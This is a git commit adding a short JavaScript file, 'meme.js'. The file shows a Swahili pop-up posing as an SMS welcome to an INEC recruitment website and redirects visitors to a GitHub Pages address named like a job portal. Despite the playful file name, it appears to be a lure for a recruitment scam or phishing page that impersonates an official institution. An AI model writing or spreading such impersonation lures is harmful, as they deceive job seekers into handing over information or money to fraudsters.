0c603f85ed7f6930d17cd1648428539ed877c6a6
offernoww <josiahnyeti16@gmail.com>
2025-03-02 12:21:41 +0100

    Create meme.js

---
+++ meme.js
@@ -0,0 +1,6 @@
+
+var password = 'INEC'
+password=prompt('SMS :Karibu kwenye tovuti ya kuajiri ya INEC, Bofya OK ili kuanza ombi lako  ','INEC');
+if (password != 'INEC') {
+location.href='https://offernoww.github.io/job.INEC.tz';
+}
